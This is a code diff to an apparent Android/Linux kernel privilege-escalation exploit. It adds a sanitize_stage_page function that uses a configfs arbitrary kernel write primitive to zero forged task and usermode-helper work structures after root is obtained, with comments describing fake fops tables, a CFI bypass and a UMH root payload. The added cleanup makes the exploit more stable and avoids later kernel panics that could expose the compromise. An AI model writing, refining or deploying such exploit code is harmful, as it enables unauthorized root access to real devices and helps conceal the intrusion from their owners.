@@ -198,6 +198,66 @@ static int trace6_resolve_phys_slot(int fd, uintptr_t *target_out,
   return 0;
 }
 
+/* sanitize_stage_page — best-effort post-success cleanup of the forged
+ * bytes on the pinned stage page. Called with the configfs primitive fd
+ * still open, after misc.fops is verified restored and the UMH root is
+ * installed (so nothing below can fail the exploit if a write misses).
+ *
+ * What it neutralizes and why:
+ *  1. fake_task->pi_waiters root + cached leftmost (2 qwords -> 0).
+ *     The exp32 chain walk enqueued the stale waiter node — which lives
+ *     on the now-dead exp32 thread stack — into this tree. Detaching the
+ *     root means any stray PI walk finds an empty tree instead of a
+ *     pointer into recycled stack memory (the classic delayed-UAF
+ *     panic days later).
+ *  2. UMH work func slot (1 qword -> 0). The queued
+ *     call_usermodehelper_exec_work item already ran (socket is up), so
+ *     the slot is dead; zeroing it guarantees a double-queue can never
+ *     re-fire UMH from this page.
+ * Deliberately NOT touched: the fake fops table itself (holds valid,
+ * CFI-correct ashmem pointers and is unreferenced since misc.fops was
+ * restored — valid pointers are safer there than NULLs). */
+static void sanitize_stage_page(int fd) {
+  const uint64_t zero = 0;
+  int ok = 0, total = 0;
+
+  if (fake_task) {
+    uintptr_t pi_waiters = fake_task + FAKE_TASK_PI_WAITERS_OFF;
+    uint64_t back = 0;
+    total++;
+    if (configfs_write_once(fd, pi_waiters, &zero, sizeof(zero)) ==
+            (ssize_t)sizeof(zero) &&
+        configfs_write_once(fd, pi_waiters + sizeof(zero), &zero,
+                             sizeof(zero)) == (ssize_t)sizeof(zero) &&
+        configfs_read_once(fd, pi_waiters, &back, sizeof(back)) ==
+            (ssize_t)sizeof(back) &&
+        back == 0) {
+      ok++;
+    } else {
+      pr_warning("sanitize: fake_task pi_waiters detach failed errno=%d\n",
+                 errno);
+    }
+  }
+
+  if (page_base) {
+    uintptr_t func_slot =
+        page_base + ROOT_UMH_WORK_OFF + WORK_FUNC_OFF;
+    uint64_t back = 0;
+    total++;
+    if (configfs_write_once(fd, func_slot, &zero, sizeof(zero)) ==
+            (ssize_t)sizeof(zero) &&
+        configfs_read_once(fd, func_slot, &back, sizeof(back)) ==
+            (ssize_t)sizeof(back) &&
+        back == 0) {
+      ok++;
+    } else {
+      pr_warning("sanitize: umh work func clear failed errno=%d\n", errno);
+    }
+  }
+
+  pr_success("sanitize stage page: %d/%d neutralized\n", ok, total);
+}
+
 int try_cfi_stage(void) {
   cfi_attempts++;
   int fd = open_ashmem_device();
@@ -406,6 +466,7 @@ int try_cfi_stage(void) {
   ssize_t owner =
     configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));
   cfi_owner_ret = owner;
+  sanitize_stage_page(fd);
   SYSCHK(close(fd));
   if (owner == (ssize_t)sizeof(null_owner) &&
       restore == (ssize_t)sizeof(original_fops)) {
